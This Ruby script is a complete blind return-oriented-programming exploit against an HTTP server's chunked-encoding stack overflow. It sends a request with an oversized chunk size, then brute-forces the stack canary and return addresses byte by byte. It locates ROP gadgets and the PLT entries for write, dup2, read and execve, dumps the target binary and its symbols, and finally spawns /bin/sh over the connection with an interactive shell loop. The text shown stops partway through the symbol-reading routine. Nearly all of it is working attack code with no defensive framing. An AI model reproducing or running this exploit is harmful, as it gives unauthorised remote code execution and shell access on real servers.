#!/usr/bin/env ruby

# Arch   - depth 10 pad 2  olen 4192 new vsyscall
# Ubuntu - depth 10 pad 3  olen 4120 new vsyscall canary
# Debian - depth 10 pad 2  olen 4192 unaligned vsyscall
# Centos - depth 10 pad 4  olen 4192 old vsyscall

# Arch   - depth 16 pad 2 ; 1 worker 18 pad 2  olen 4192
# Ubuntu - depth 16 pad 3 ; 1 worker 18 pad 3  olen 4120

require 'socket'
require 'timeout'

$ip = "127.0.0.1"
$port = 80

$vsyscall = 0xffffffffff600000
$death = 0x41414141414141
$text = 0x400000
$pops = []

#$depth = 10
#$pad = 2
$pad = 0
$reqs = 0
$padval = 0x4141414141414141
#$padval = $text

$to = 1
$url = "/"

VSYSCALL_OLD		= 1
VSYSCALL_UNALIGNED	= 2
VSYSCALL_NEW		= 3

def grab_socket()
	return TCPSocket.new($ip, $port) if not $sport

	got = false

	s = ""

	if not $localip
		s = TCPSocket.new($ip, $port)
		$localip = s.local_address.ip_address
		s.close()

		print("\nlocalip #{$localip}\n")
	end

	for i in 0..100
		begin
			s = Socket.new(:INET, :STREAM)

			s.setsockopt(:SOCKET, :REUSEADDR, true)

			sockaddr = Socket.sockaddr_in(7000 + i, $localip)
			s.bind(sockaddr)

			s.connect(Socket.pack_sockaddr_in($port, $ip))
			got = true
			break
		rescue Errno::EADDRNOTAVAIL
			s.close()
		end
	end

	abort("nope") if not got

	return s
end

def get_child()
        s = nil
        found = false

        while !found
                s = nil
	
		begin 
			timeout(1) do
				s = grab_socket()
			end
		rescue
			print("Connect timeout\n")
			next
		end

                req = "GET #{$url} HTTP/1.1\r\n"
                req << "Host: bla.com\r\n"
                req << "Connection: Keep-Alive\r\n"
                req << "\r\n"
                
                s.puts(req)
                begin   
                        timeout(5) do
                                r = s.gets
                                if r.index("200 OK") != nil or r.index("404") != nil or r.index("302") != nil
                                        found = true
                                        break
                                end                                                                           
                        end                                                                                   
                rescue
                end

                break if found

                print("Bad child\n")
                s.close
        end

        read_response(s)

        return s
end

def read_response(s)
        cl = 0
        while true
                r = s.gets
                if r.index("Content-Length") != nil
                        cl = Integer(r.split()[1])
                end
                
                if (r == "\r\n")
                        r = s.read(cl)
                        break
                end
        end
end

def send_initial(s)
	$reqs += 1

        sz = 0xdeadbeefdeadbeeff.to_s(16)

        req = "GET #{$url} HTTP/1.1\r\n"
        req << "Host: bla.com\r\n"
        req << "Transfer-Encoding: Chunked\r\n"
        req << "Connection: Keep-Alive\r\n"
        req << "\r\n"
        req << "#{sz}\r\n"

        s.write(req)
	s.flush()

        read_response(s)
end

def send_exp(s, rop)
	send_initial(s)

        data = "A" * ($overflow_len - 8)
	$pad.times do
		padval = $padval
		data << [padval].pack("Q") # rbp
	end

        data << rop.pack("Q*")

	set_canary(data)

        s.write(data)                                                                                         
        s.flush()                                                                                             
end

def check_alive(s)
	sl = 0.01
	rep = $to.to_f / 0.01
	rep = rep.to_i

	rep.times do 
		begin
			x = s.recv_nonblock(1)
			return false if x.length == 0

			print("\nDamn got stuff #{x.length} #{x}\n")
			return false
		rescue Errno::EAGAIN
			sleep(sl)
		rescue Errno::ECONNRESET
			return false
		end
	end

	return true
end

def check_vuln()
	print("Checking for vuln... ")

	s = get_child()
	send_initial(s)

	s.write("A\n")
	s.flush()

	abort("Not vuln") if not check_alive(s)

	s.close()

	a = Time.now

	s = get_child()
	send_initial(s)

	s.write("A" * 5000)
	s.flush()

	abort("Not vuln2") if check_alive(s)

	s.close()

	el = Time.now - a
	el *= 4.0
#	el = el.to_i
	$to = el

#	$to = 0.5 if $to <= 0

#	$to = 1

	print("Vuln\n")

	print("Timeout is #{$to}\n")
end

def canary_detect(len)
	print("Checking for canary... at #{len}\n")

	canary = []

	$sport = true

	while canary.length < 8
		found = false

		for i in 0..255
			print("Testing #{i.to_s(16)}\r")

			s = get_child()
			send_initial(s)

			data = "A" * len

			for c in canary
				data << [c].pack("C")
			end
				
			data << [i].pack("C")

			s.write(data)                                                  
			s.flush()

			rc = check_alive(s)
			s.close()

			if rc == true
				print("\nFound #{i.to_s(16)}\n")
				canary << i
				found = true
				break
			end
		end

		raise("canary not found") if not found
	end

	val = 0
	for i in 0..(canary.length - 1)
		val |= canary[i] << (i * 8)
	end

	$canary = val
	$canary_offset = len

	print("Canary 0x#{$canary.to_s(16)} at #{$canary_offset}\n")
end

def set_canary(data)
	return if not $canary

	can = [$canary].pack("Q")

	return if data.length < $canary_offset + can.length

	for i in 0..(can.length - 1)
		data[$canary_offset + i] = can[i]
	end
end

def check_overflow_len()
	len = 4096
	s = nil
	expected = 4192

	while true
		print("Check overflow len ... #{len}\r")

		s = get_child()
		send_initial(s)

		data = "A" * len
		set_canary(data)

		s.write(data)                                                                                         
		s.flush()                                                                                             

		break if not check_alive(s)

		len += 8
		s.close()
	end
	print("\n")

	s.close()

	if len == 4112 and not $canary
		canary_detect(len - 8)
		print("Trying again with canary...\n")
		check_overflow_len()
		return
	end

	print("WARNING unexpected overflow len\n") if len != expected

	$overflow_len = len
end

def check_stack_depth()
	depth = 1
	max = 100

	while depth < max
		print("Trying depth #{depth}\r")
		rop = Array.new(depth) { |i| $ret }

		s = get_child()
		send_exp(s, rop)

		break if check_alive(s)

		s.close()

		depth += 1
	end
	print("\n")

	abort("nope") if depth == max

	s.close()

	$depth = depth
end

def check_pad()
	pad = 0
	max = 100

	while pad < max
		print("Trying pad #{pad}\r")
		rop = Array.new($depth) { |i| $ret }

		for i in 0..pad
			padval = $padval
			rop[i] = padval
		end

		s = get_child()
		send_exp(s, rop)

		break if not check_alive(s)

		s.close()

		pad += 1
	end

	print("\n")

	$pad = pad
	$depth -= $pad

	print("Depth #{$depth} pad #{$pad}\n")

	s.close()
end

def do_try_exp(rop)
        s = get_child()
        send_exp(s, rop)

        alive = check_alive(s)
        if not alive
		s.close()
		return false
	end

        req = "0\r\n"
        req << "\r\n"
        req << "GET #{$url} HTTP/1.1\r\n"
        req << "Host: bla.com\r\n"
        req << "Transfer-Encoding: Chunked\r\n"
        req << "Connection: Keep-Alive\r\n"
        req << "\r\n"

        s.write(req)

	alive = check_alive(s)
	s.close()

	return true if not alive

	return 2
end

def try_exp(rop)
	while true
		begin
			return do_try_exp(rop)
		rescue Errno::ECONNRESET
			print("Conn reset\n")
			sleep(1)
		end
	end
end

def try_exp_print(addr, rop)
        print("\rAddr 0x#{addr.to_s(16)} ... ")

        r = try_exp(rop)

        print("ret\n") if (r == true)
        print("infinite loop\n") if (r == 2)

        return r
end

def verify_pop(pop)
#	ret = $ret ? $ret : pop + 1
	ret = pop + 1

        rop = Array.new($depth - 1) { |j| ret }
	rop << pop + 1

        return false if try_exp(rop) != true

        rop = Array.new($depth) { |j| pop + 1 }
	rop[1] = $death

	return false if try_exp(rop) != false

        rop = Array.new($depth) { |j| ret }
	rop[0] = pop
	rop[1] = 0x4141414141414141
	rop[2] = $death

	return false if try_exp(rop) != false

	if not $ret
		$ret = ret
		print("Found ret #{$ret.to_s(16)}\n")
	end

	return true
end

def check_pop(pop)
	check_rax(pop)
	check_rdi(pop)
end

def check_rdi(pop)
	return if not check_multi_pop(pop, 9, 6)

	print("Found POP RDI #{pop.to_s(16)}\n")

	$rdi = pop
end

def check_rax_rsp(pop)
	# pop rax ; ret => add $0x58, rsp
	return check_multi_pop(pop, 3, 11)
end

def check_multi_pop(pop, off, num)
	rop = Array.new($depth) { |j| pop + 1 }

	idx = $depth - num - 1
	if idx < 2
		print("FUCK\n")
		exit(1)
	end
	rop[idx] = pop - off
	rop[-1] = $death

	rc = try_exp(rop)

	return true if rc == true

	return false
end

def check_rax_syscall(pop)
	rop = []
	rop << pop
	rop << 34 # pause
	rop << $syscall
	rop << $death

	r = try_exp(rop)
	return true if r == 2

	return false
end

def check_rax(pop)
	rc = false
	if not $syscall
		rc = check_rax_rsp(pop)
	else
		rc = check_rax_syscall(pop)
	end

	return if rc == false

	print("POP RAX at 0x#{pop.to_s(16)}\n")
	$rax = pop
end

def find_pops()
	$start = 0x418a00
	$end   = 0x500000

	$start = 0x418b00
	$start = $ret - 0x1000

	skip = 0

	print("Finding POPs\n")

	start = $start
	start = $pos if $pos

	for i in start..$end
		if skip > 0
			skip -= 1
			next
		end

		rop = []

		($depth / 2).times do
			rop << i
			rop << 0x4141414141414141
		end

		if $depth % 2 != 0
			rop << (i + 1)
			print("FUCK #{$depth} #{$depth % 2}\n")
		end

                r = try_exp_print(i, rop)
		if r == true
			if verify_pop(i)
				print("Found POP at 0x#{i.to_s(16)}\n")
				$pops << i
				check_pop(i)
			end
		end

		if r == 2
			skip = 100
		end

		$pos = i

		break if $rdi
	end
end

def find_rdi()
        for i in $pops
                rop = []

#               for j in $pops
#                       rop << j
#                       rop << 0
#               end
                
                rop << i
                rop << 0x0400000 # struct timespec

                rop << $rax
                rop << 35 # nanosleep
                
                rop << $syscall
                rop << $death
                
                r = try_exp_print(i, rop)
                if r == 2
			print("POP RDI at #{i}\n")
			$rdi = i
			return i
                end
        end

        return 0
end

def pause_child()
        rop = []
        rop << $rax
        rop << 34
        rop << $syscall

        s = get_child()
        send_exp(s, rop)

        return s
end

def try_rsi_kill(i)
        s = pause_child()

        rop = []
        
        rop << $rdi
        rop << 0
        
        rop << i
        rop << 0
        
        rop << $rax
        rop << 62 # kill

        rop << $syscall
        rop << $death

        try_exp(rop)

        for rep in 0..3
                begin   
                        x = s.recv_nonblock(1)
                        if x.length == 0
                                s.close()                                                                    
                                return false
                        end
                rescue Errno::EAGAIN
                end
        end

        return s

end

def find_rsi()
        s = pause_child()

        for i in $pops
                begin   
                        a = s.recv_nonblock(1)
                        raise "damn"
                rescue Errno::EAGAIN
                end

                rop = []

                rop << $rdi
                rop << 0
                
                rop << i
                rop << 9
                
                rop << $rax
                rop << 62 # kill
                
                rop << $syscall
                rop << $death
                
                r = try_exp_print(i, rop)
                next if r != false
                
                for rep in 0..3
                        begin   
                                a = s.recv_nonblock(1)
                                if a.length == 0
                                        s.close()                                                            

                                        s = try_rsi_kill(i)
                                        if s != false
                                                s.close()
                                                print("\n")
						print("POP RSI #{i}\n")
						$rsi = i
                                                return i
                                        end
                                        s = pause_child()
                                        break
                                end
                        rescue Errno::EAGAIN
                                sleep(0.1)
                        end
                end
        end

        return 0
end

def dump_fd_addr(fd, addr, write = $write, listnum = 2)
#	rop << $rsi
#	rop << addr
#
#	rop << $rax
#	rop << 1
#
#	rop << $syscall
#	rop << $death

	listeners = []

	for i in 0..listnum
		listener = get_child()
		listeners << listener
	end

	rop = []

	set_rdx(rop) if $strcmp

	for i in 0..20
		f = fd
		a = addr + (i * 4)

		if fd == -1
			f = 15 + i
			a = addr
		end

		rop << $rdi
		rop << f

		rop << $rdi - 2
		rop << a
		rop << 0

		rop << ($plt + 0xb)
		rop << write
	end

	rop << $death

        s = get_child()
        send_exp(s, rop)
	s.close()

	x = ""

	10.times do
		for l in listeners
			begin
				x = l.recv_nonblock(4096)
				if x.length > 0
					while true
						more = l.recv(4096)

						break if more.length == 0

						x += more
					end
					break
				end
			rescue Errno::EAGAIN
			end
		end

		break if x.length > 0
#		sleep(0.01)
	end

	for l in listeners
		l.close()
	end

	return x
end

def dump_addr(addr)
	fd = 100

	rop = []

	rop << $rdi - 2
	rop << fd
	rop << 0

	rop << ($plt + 0xb)
	rop << $dup

	for i in 0..20
		set_rdx(rop)

		rop << $rdi
		rop << fd

		rop << $rdi - 2
		rop << addr + (i * 7)
		rop << 0

		rop << ($plt + 0xb)
		rop << $write
	end

	rop << $death

	s = get_child()
	send_exp(s, rop)

	x = ""

	while true
		r = s.recv(4096)

		break if r.length == 0

		x += r
	end

	s.close()

	return x
end

def dump_bin()
	addr = 0x400000
	fd = 3
	err = 0

        f = File.open("text.bin", "wb")

	last = Time.now

	while true
		print("Dumping #{addr.to_s(16)} ...")
#		x = dump_fd_addr(15, addr, $write, 50)
		x = dump_addr(addr)
#		x = dump_fd_addr(3, addr, $write, 1)

		print(" #{x.length}    \r")

		if x.length > 0
			addr += x.length
			f.write(x)
			last = Time.now
#			print("\n")
			err = 0
		else
			el = Time.now - last
			el = el.to_i
			
			err += 1
			break if el > 5
#			break if err > 20
		end
	end
	print("\n")

	f.close()
end

def check_syscall_ret(addr)
        rop = Array.new($depth) { |j| addr }

	return false if try_exp(rop) == false

        rop = Array.new($depth) { |j| addr + 2 }

	return false if try_exp(rop) == false

	$syscall = addr
	$ret = addr + 2 if not $ret

	return true
end

def check_old_vsyscall()
	print("Checking for old vsyscall\n")

	0x40.downto(0) { |i|
		addr = $vsyscall + 1024 + i

        	rop = Array.new($depth) { |j| addr }

		if try_exp_print(addr, rop) == true
			$ret = addr if not $ret
			return true
		end
	}

	return false
end

def check_vsyscall()
	s = 2 + 10
	e = s + 2

	for depth in s..e
		$depth = depth
		print("Checking vsyscall depth #{depth}\n")
		rc = do_check_vsyscall()

		$vsyscall_mode = rc
		break if rc != VSYSCALL_NEW
	end

	$depth = nil
	print("Syscall mode is #{$vsyscall_mode}\n")
end

def do_check_vsyscall()
        rop = Array.new($depth) { |j| $vsyscall }

	if try_exp(rop) == false
		if check_old_vsyscall()
			return VSYSCALL_OLD
		else
			return VSYSCALL_NEW
		end
		return
	end

        rop = Array.new($depth) { |j| ($vsyscall + 0xa) }

	if try_exp(rop) == false
		if check_syscall_ret($vsyscall + 0x7)
			return VSYSCALL_UNALIGNED
		end
	end

	print("Dunno\n")
	exit(1)
end

def determine_target()
	if $overflow_len == 4192 and $vsyscall_mode == VSYSCALL_NEW
#		$depth = 16
		$depth = 10
		$pad = 2
	end

	print("Pad #{$pad} Depth #{$depth}\n")
end

def find_plt(dep = 0, start = $text, len = 0x10000)
	plt  = start
	plte = plt + len

	print("Finding plt #{plt.to_s(16)} - #{plte.to_s(16)}\n")

	while true
		for d in 0..dep
			if try_plt($depth + d, plt)
				$plt = plt
				$depth += d
				print("Found PLT #{plt.to_s(16)} depth #{$depth}\n")
				return
			end
		end

		plt += 0x10 * 30

		break if plt >= plte
	end
end

def try_plt(depth, plt)
	rop = Array.new(depth) { |i| plt }

        r = try_exp_print(plt, rop)
	if r == true
		rop = Array.new(depth) { |i| plt + 6 }

		return true if try_exp(rop)
	end

	return false
end

def find_write()
	write = $plt

	print("Finding write\n")

	while true
		print("Trying #{write.to_s(16)}\r")

		x = dump_fd_addr(20, 0x400000, write, 50)
		if x.length == 84 and x[1] == 'E'
			printf("\nwrite at #{write.to_s(16)} (#{x.length})\n")
			$write = write
			return
		end

		write += 0x10

		if write > ($plt + 200 * 0x10) 
			print("Trying again\n")
			write = $plt
		end
	end
end

def set_rdx(rop, good = 0x400000)
#	good = 0x400000
#	good = $vsyscall + 100

	rop << $rdi
	rop << good

	rop << $rdi - 2
	rop << good
	rop << 0

	rop << ($plt + 0xb)
	rop << $strcmp
end

def got_write(x)
##	if $canary
## 		return if x.length != 7
## 	else
## 		return if x.length != 4
## 	end

	return if x.length < 4

	return false if x[1] != 'E'
	return false if x[2] != 'L'
	return false if x[3] != 'F'

	return true
end

def try_write(listeners, write)
	if call_plt(write, $death, $death) != true
		print("Skippin #{write.to_s(16)}\n")
		return false
	end

	listc = 50

	for l in listeners
		begin
			x = l.recv_nonblock(1)
			if x.length == 0
				l.close()
				listeners.delete(l)
				next
			end
		rescue Errno::EAGAIN
		end
	end

	conn = 0

	while listeners.length < listc
		listeners << get_child()
		conn += 1
	end

#	print("Connected #{conn} listeners\n") if conn > 0

	addr = 0x400000
	fd = 15

	rop = []

	set_rdx(rop) if $canary

	rop << $rdi
	rop << fd

	rop << $rdi - 2
	rop << 0x400000
	rop << 0

	rop << ($plt + 0xb)
	rop << write
#	rop << write
#	rop << write

#	need = $depth - rop.length
#	need.times do
#		rop << $plt
#	end
	rop << $death

        s = get_child()
        send_exp(s, rop)
	s.close()

	($to / 0.01).to_i.times do
		for l in listeners
			begin
				x = l.recv_nonblock(4096)
				if x.length == 0
					l.close()
					listeners.delete(l)
					next
				end

				if got_write(x)
					for l in listeners
						l.close()
					end
					return true
				end

				abort("dunno")
			rescue Errno::EAGAIN
			end
		end
		sleep(0.01)
	end

	return false
end

def try_write2(listeners, write)
	addr = 0x400000

	rop = []

	for fd in 0..50
		set_rdx(rop)

		rop << $rdi - 2
		rop << 0x400000
		rop << 0

		rop << $rdi
		rop << fd

		rop << ($plt + 0xb)
		rop << write
	end

	rop << $death

        s = get_child()
        send_exp(s, rop)

	stuff = ""

	sl = 0.01
	rep = $to.to_f / 0.01
	rep = rep.to_i
	rep.times do
		begin
			x = s.recv_nonblock(4096)
			break if x.length == 0

			stuff += x
		rescue Errno::EAGAIN
		rescue Errno::ECONNRESET
			break
		end
		sleep(sl)
	end
	s.close()

	return got_write(stuff)
end

def find_write2()
	print("Finding write\n")

	listeners = []

	write = 0
	while true
		print("Trying #{write.to_s(16)}\r")

		if try_write2(listeners, write)
			printf("\nwrite at #{write.to_s(16)}\n")
			$write = write
			return
		end

		write += 1

		if write > 200
			print("\nTrying again\n")
			write = 0
		end
	end
	exit(1)
end

def stack_read()
	print("Stack reading\n")

	stack = []

	while true
		x = stack_read_word(stack)
		stack << x

		print("Stack has 0x#{x.to_s(16)}\n")

		break if x > 0x400000 and x < 0x500000

                if (x & 0x7fff00000000) == 0x7fff00000000
                        print("Stack ptr #{x.to_s(16)}\n")
                elsif (x & 0x7f0000000000) == 0x7f0000000000
                        print(".text ptr #{x.to_s(16)}\n")
                        $aslr = x
                        break
                end
	end

	$pad = stack.length - 1
	$ret = stack[-1]
	$depth = 10

	print("Pad #{$pad} Ret #{$ret.to_s(16)}\n")
end

def stack_read_word(pad)
	stack = []

	while stack.length < 8
		found = false

		for i in 0..255
			print("\rTesting #{i.to_s(16)}")

			s = get_child()
			send_initial(s)

			data = "A" * ($overflow_len - 8)

			data << pad.pack("Q*")

			for x in stack
				data << [x].pack("C")
			end

			data << [i].pack("C")

			set_canary(data)

			s.write(data)                                                  
			s.flush()

			rc = check_alive(s)
			s.close()

			if rc == true
				print(" - Found #{i.to_s(16)}\n")
				stack << i
				found = true
				break
			end
		end

		print("\nNot found... damn - trying again\n") if not found
	end

	val = 0
	for i in 0..(stack.length - 1)
		val |= stack[i] << (i * 8)
	end

	return val
end

def print_progress()
	if not $startt
		$startt = Time.now
		return
	end

	now = Time.now
	elapsed = now - $startt
	elapsed = elapsed.to_i

	print("==================\n")
	print("Reqs sent #{$reqs} time #{elapsed}\n")
	print("==================\n")

	do_state(true, true)
end

def exp()
	print("Exploiting\n")

	listeners = []

	rop = []

	fd = 15
	rop << $rdi
	rop << fd
	rop << $rdi - 2
	rop << 0
	rop << 0
	rop << 0x0000000000402810 # dup2

	rop << $rdi
	rop << fd
	rop << $rdi - 2
	rop << 1
	rop << 0
	rop << 0x0000000000402810 # dup2

	rop << $rdi
	rop << fd
	rop << $rdi - 2
	rop << 2
	rop << 0
	rop << 0x0000000000402810 # dup2

	wr = 0x0068cf60
	rop << $rdi - 2
	rop << 0x0068732f6e69622f # /bin/sh
	rop << 0

	rax = 0x441b88
	rop << rax
	rop << wr
	rop << 0x42a98b # mov rsi, (rax)

	rdx = 0x404f4b
	rop << rax
	rop << wr + 0x7d
	rop << rdx
	rop << 0

	rop << $rdi - 2
	rop << 0
	rop << 0

	rop << $rdi
	rop << wr

	rop << 0x4029b0 # execve

#	rop << 0xffffffffff600001
	rop << 0x400000

        s = get_child()

	50.times do
		listeners << get_child()
	end

        send_exp(s, rop)

	for l in listeners
		l.write("\n\n\n\n\n\n\nid\n")
	end

	x = ""
	10.times do
		for l in listeners
			begin
				x = l.recv_nonblock(1024)
			rescue Errno::EAGAIN
			end

			if x.length > 0
				s.close()
				s = l
				break
			end
		end

		break if x.length > 0

		sleep(0.1)
	end

	for l in listeners
		l.close() if l != s
	end

	s.write("uname -a\nid\n")

	dropshell(s)

	exit(1)
end

def dropshell(s)
	while true
		r = select([s, STDIN], nil, nil)

		if r[0][0] == s
			x = s.recv(1024)

			break if x.length == 0

			print("#{x}")
		else
			x = STDIN.gets()

			s.write(x)
		end
	end
end

def find_fd()
	print("Finding FD\n")

	for fd in 15..20
		print("Trying #{fd} ... \r")

		x = dump_fd_addr(fd, 0x400000, $write, 50)

		if x.length > 0
			print("\nFound FD #{fd}\n")
			break
		end
	end

	exit(1)
end

def get_dist(gadget, inc)
	dist = 0

	for i in 1..7
                rop = Array.new($depth) { |j| $plt }

		rop[0] = gadget + inc * i

		break if try_exp(rop) != true
		dist = i
	end

	return dist
end

def verify_gadget(gadget)
	left = 0
	right = 0

	left  = get_dist(gadget, -1)
	right = get_dist(gadget, 1)

	return false if left + right != 6

	print("LEFT #{left} RIGHT #{right} addr #{gadget.to_s(16)}\n")

	rdi = gadget + right - 1

	return check_rdi(rdi)
end

def find_gadget()
	print("Finding gadget\n")

	$start = $ret
	$end = $ret + 0x100000

	start = $start
	start = $pos if $pos
	skip = 0

	for i in start..$end
		if skip > 0
			skip -= 1
			next
		end

		rop = []

		rop = Array.new($depth) { |j| $plt }

		rop[0] = i

                r = try_exp_print(i, rop)
		if r == true
			if verify_gadget(i)
				print("Found POP at 0x#{i.to_s(16)}\n")
				$pops << i
				check_pop(i)
			end
		end

		if r == 2
			skip = 100
		end

		$pos = i

		break if $rdi

		skip = 7
	end
end

def find_plt_depth_aslr()
	print("PLT AT #{$aslr.to_s(16)}\n")
	start = 0x7fd10a00d000
	$depth = 32
	$pad = 0
	len = 0x10000

	start = $aslr & ~0xfff

	while not $plt
		find_plt(2, start, len)

		start -= len

		break if $plt

		print("\n nope\n")
	end
end

def find_plt_depth()
	if $aslr
		find_plt_depth_aslr()
		return
	end

	$depth = 18
	$pad   = 0

	find_plt(4)

#	if not $plt
#		print("Assuming conf worker = 1\n")
#		$depth = 10
#		find_plt(2)
#	end

	return if not $plt

	$ret = $plt

	check_pad()

	$ret   = 0x430000
end

def call_plt(entry, arg1, arg2)
	rop = []

	rop << $rdi
	rop << arg1

	rop << $rdi - 2
	rop << arg2
	rop << 0

	rop << ($plt + 0xb)
	rop << entry

	($depth - rop.length).times do
		rop << $plt
	end

	return try_exp(rop)
end

def try_strcmp(entry)
	print("Trying PLT entry #{entry.to_s(16)}\r")

	good = 0x400000

	return false if call_plt(entry, 3, 5) != false
	return false if call_plt(entry, good, 5) != false
	return false if call_plt(entry, 3, good) != false

	return false if call_plt(entry, good, good) != true
	return false if call_plt(entry, $vsyscall + 0x1000 - 1, good) != true

	return true
end

def find_rdx()
	print("Finding strcmp\n")

	for i in 0..256
		if try_strcmp(i)
			print("\nFound strcmp at PLT 0x#{i.to_s(16)}\n")
			$strcmp = i
			break
		end
	end
end

def find_dup()
	print("Find dup2\n")

	fd = 100

	for i in 0..200
		print("Trying dup2 at #{i.to_s(16)}\r")

		rop = []

		rop << $rdi - 2
		rop << fd
		rop << 0

		rop << ($plt + 0xb)
		rop << i

		set_rdx(rop)

		rop << $rdi
		rop << fd

		rop << $rdi - 2
		rop << 0x400000
		rop << 0

		rop << ($plt + 0xb)
		rop << $write
		rop << $death

		s = get_child()
		send_exp(s, rop)

		x = s.recv(4096)

		s.close()

		if got_write(x)
			print("\nFound dup at #{i.to_s(16)}\n")
			$dup = i
			break
		end
	end
end

def do_read(rop, fd, writable, read = $read)
	rop << $rdi
	rop << fd

	rop << $rdi - 2
	rop << writable
	rop << 0

	10.times do
		rop << ($plt + 0xb)
		rop << $write
	end

	10.times do
		rop << ($plt + 0xb)
		rop << read
	end

	rop << ($plt + 0xb)
	rop << $write
end

def do_read2(rop, fd, writable)
	set_rdx(rop, $goodrdx)

	rop << $rdi
	rop << fd

	rop << $rdi - 2
	rop << writable
	rop << 0

	rop << ($plt + 0xb)
	rop << $write

	rop << $rdi
	rop << 1000 * 1000 * 2

	rop << ($plt + 0xb)
	rop << $usleep

	set_rdx(rop, $goodrdx)

	rop << $rdi
	rop << fd

	rop << $rdi - 2
	rop << writable
	rop << 0

	rop << ($plt + 0xb)
	rop << $read

	set_rdx(rop, $goodrdx)

	rop << $rdi
	rop << fd

	rop << $rdi - 2
	rop << writable
	rop << 0

	rop << ($plt + 0xb)
	rop << $write
end

def find_read()
	print("Finding read\n")

	fd = 100

	# 0x00690000
	writable = $writable
	str = "pwneddd"

	for i in 0..200
		print("Trying read at #{i.to_s(16)}\r")

		rop = []

		rop << $rdi - 2
		rop << fd
		rop << 0

		rop << ($plt + 0xb)
		rop << $dup

		set_rdx(rop)
		do_read(rop, fd, writable, i)

		rop << $death

		s = get_child()
		send_exp(s, rop)

		x = s.recv(1)
		s.write(str)

		stuff = "" + x

		while true
			begin
				x = s.recv(4096)
			rescue
				break
			end

			break if x.length == 0

			stuff += x
		end

		s.close()

		if stuff.include?(str)
			print("\nFound read at #{i.to_s(16)}\n")
			$read = i
			break
		end
	end
end

def dup_fd(rop, fd, src = false)
	rop << $rdi - 2
	rop << fd
	rop << 0

	if src != false
		rop << $rdi
		rop << src
	end

	rop << ($plt + 0xb)
	rop << $dup
end

def find_good_rdx()
	print("Finding good rdx\n")

	addr = $rdi - 9

	fd = 100

	while true
		rop = []

		dup_fd(rop, fd)
		set_rdx(rop, addr)

		rop << $rdi
		rop << fd

		rop << $rdi - 2
		rop << addr
		rop << 0

		rop << ($plt + 0xb)
		rop << $write
		rop << $death

		s = get_child()
		send_exp(s, rop)
		x = s.recv(4096)

		print("GOT #{x.length} at #{addr.to_s(16)}\n")

		if x.length >= 8
			$goodrdx = addr
			break
		end
		addr += x.length + 1

		addr += 1 if x.length == 0
	end
end

def do_execve(i = $execve)
	print("Trying execve at #{i.to_s(16)}\r")

	fd = 100

	# 0x00690000
	writable = $writable
	str = "/bin/sh\0"

	rop = []

	dup_fd(rop, fd)
	dup_fd(rop, 0, fd)
	dup_fd(rop, 1, fd)
	dup_fd(rop, 2, fd)

	do_read2(rop, fd, writable)

	set_rdx(rop, 0x400000 + 8)

	rop << $rdi
	rop << writable

	rop << $rdi - 2
	rop << 0
	rop << 0

	rop << ($plt + 0xb)
	rop << i
	rop << $death

	s = get_child()
	send_exp(s, rop)
	x = s.recv(1)
	s.write(str)

	print("Wait 2 secs...\n")

	stuff = "" + x

	while true
		begin
			x = s.recv(4096)
		rescue
			break
		end

		break if x.length == 0

		stuff += x

		print("Got #{x.length}\n")

		break if stuff.include?(str)
	end

	if not stuff.include?(str)
		print("Write didn't happen\n")
		s.close()
		return
	end

	s.write("\n\n\n\n\nid\n\n")

	while true
		begin
		  timeout (1) do
			x = s.recv(4096)
		  end
		rescue
			break
		end
			
		break if x.length == 0

		if x.include?("uid")
			print("\nFound execve at #{i.to_s(16)}\n")
			$execve = i
			save_state()
			print_progress()
			s.write("uname -a\nid\n")
			dropshell(s)
			s.close()
			exit(1)
			return
		end
	end

	s.close()
end

def find_execve()
	print("Finding exec\n")

	for i in 0..200
		do_execve(i)
	end

	print("\n")
end

# search for ascii ZERO ascii
def has_str(stuff, skip = 0, strict = false)
	# 0 start
	# 1 found first ascii
	# 2 found zero
	# 3 found second ascii
	state = 0

	len = 0
	min = 3

	stuff.each_byte do |c|
		if skip > 0
			skip -= 1
			next
		end

		ascii = (c >= 0x20 and c <= 0x7E)

		case state
		when 0
			if ascii
				state = 1
				len   = 0
			else
				return false if strict
			end

		when 1
			if ascii
				len += 1
			elsif c == 0
				if len >= min
					state = 2
					len = 0
				else
					state = 0
					return false if strict
				end
			else
				state = 0
				return false if strict
			end

		when 2
			if ascii
				len += 1

				return true if len >= min
			else
				state = 0
				return false if strict
			end
		else
			abort("morte")
		end
	end

	return false
end

def got_sym(symno, symname)
	if symname == "read"
		$read = symno
		print("Read at 0x#{$read.to_s(16)}\n")
	elsif symname == "execve"
		$execve = symno
		print("Execve at 0x#{$execve.to_s(16)}\n")
	elsif symname == "usleep"
		$usleep = symno
		print("usleep at 0x#{$usleep.to_s(16)}\n")
	end
end

def read_sym()
	print("Reading sym\n")

	prog = ""
	addr_start = 0x00400200 
	addr = addr_start
	dynstr = 0

	while true
		print("Reading #{addr.to_s(16)}\r")
		x = dump_addr(addr)
		break if x.length == 0

		prog += x
		addr += x.length

		# I know it can be more efficient...
		if dynstr == 0 and has_str(prog)
			print("Found strings at #{addr.to_s(16)}\n")
			for i in 0..(prog.length - 1)
				if has_str(prog, i, true)
					dynstr = addr_start + i

					abort("damn") if i < 1
					abort("fdsf") if prog[i - 1] != "\x00"

					# XXX check 24 byte alignment

					dynstr -= 1
					print("dynstr at 0x#{dynstr.to_s(16)}\n")
					break
				end
			end
		end

		break if dynstr != 0
	end

	idx = dynstr - addr_start

	dynsym = 0
	symlen = 24

	while idx >= 0
		zeros = 0

		for i in 0..(symlen-1)

			c = prog[idx + i]

			zeros += 1 if c == "\x00"
		end

		if zeros == symlen
			dynsym = addr_start + idx
			break
		end

		idx -= symlen
	end

	if dynsym == 0
        	File.open("morte.bin", "w") { |file| file.write(prog) }
	end

	print("dynsym at 0x#{dynsym.to_s(16)}\n")

	idx = dynsym - addr_start

	print("Dumping symbols\n")

	symno = 0
	symtab = {}
	while idx < (dynstr - addr_start)
		stri = prog[idx..(idx + 3)]
		stri = stri.unpack("L<")[0]

		type = prog[idx + 4]
		type = type.unpack("C")[0]
		type &= 0xf

		val = prog[(idx + 8)..(idx + 16)]
		val = val.unpack("Q")[0]

		if stri > 0
			need = dynstr + stri + 30

			while addr < need
				print("Reading #{addr.to_s(16)}\r")
				x = dump_addr(addr)
				abort("dai") if x.length == 0

				prog += x
				addr += x.length
			end

			strstart = dynstr + stri - addr_start
			strend = strstart
			for i in strstart..(prog.length - 1)
				if prog[i] == "\x00"
					strend = i - 1
					break
				end
			end

			symname = prog[strstart..strend]

			print("Sym #{symno} #{type} #{symname}")
			print(" #{val.to_s(16)}") if val != 0
			print("\n")

			symtab[symno + 1] = symname
